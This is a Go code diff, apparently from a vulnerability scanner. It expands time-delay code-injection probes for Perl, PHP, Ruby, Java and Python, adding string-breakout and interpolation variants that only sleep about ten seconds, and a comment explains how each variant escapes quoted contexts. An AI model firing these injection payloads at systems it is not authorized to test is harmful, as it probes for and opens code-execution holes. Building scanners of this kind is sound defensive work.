@@ -56,13 +56,47 @@ var windowsPayloads = []string{
 	"& timeout /T 10 /NOBREAK",
 }
 
-// langPayloads maps language to specific command injection payloads.
+// langPayloads maps a language to time-based code-injection payloads. Unlike the
+// generic shell payloads above (which reach an OS shell), these are evaluated
+// *inside* the interpreter, where injected input typically lands within a quoted
+// string literal in the source. Each language therefore ships the same sleep in
+// several breakout contexts — a bare form (direct concatenation into code), single-
+// and double-quoted string breakouts, and the interpreter's string-interpolation
+// form — so the probe fires wherever the value is embedded, not only when it is
+// concatenated raw.
+//
+// The sleep argument is wrapped in a function that only the target language
+// defines (PHP hexdec/dechex, Perl lc, Ruby .to_i, Python compile/eval). Every
+// wrapper still evaluates to delaySeconds, so the fixed-delay confirmation below is
+// unchanged — but because a bare sleep() is accepted by several of these
+// interpreters, the wrapper makes an observed delay attributable to one specific
+// engine rather than ambiguous across all of them.
 var langPayloads = map[string][]string{
-	"perl":   {"/bin/sleep 10|"},
-	"php":    {`"; sleep(10);"`},
-	"ruby":   {"#{`sleep 10`}"},
-	"java":   {"${T(java.lang.Thread).sleep(10000)}"},
-	"python": {"__import__('time').sleep(10)"},
+	"perl": {
+		"sleep(lc(10))",
+		"'.sleep(lc(10)).'",
+		`".sleep(lc(10))."`,
+		"/bin/sleep 10|",
+	},
+	"php": {
+		"sleep(hexdec(dechex(10)))",
+		"'.sleep(hexdec(dechex(10))).'",
+		`".sleep(hexdec(dechex(10)))."`,
+		"{${sleep(hexdec(dechex(10)))}}",
+	},
+	"ruby": {
+		"sleep(10.to_i)",
+		"'+sleep(10.to_i)+'",
+		`"+sleep(10.to_i)+"`,
+		"#{sleep(10.to_i)}",
+	},
+	"java": {"${T(java.lang.Thread).sleep(10000)}"},
+	"python": {
+		"__import__('time').sleep(10)",
+		"'+__import__('time').sleep(10)+'",
+		`"+__import__('time').sleep(10)+"`,
+		"eval(compile('for x in range(1):\n import time\n time.sleep(10)','a','single'))",
+	},
 }
 
 // Time-delay detection tuning. Picked to keep false positives rare without
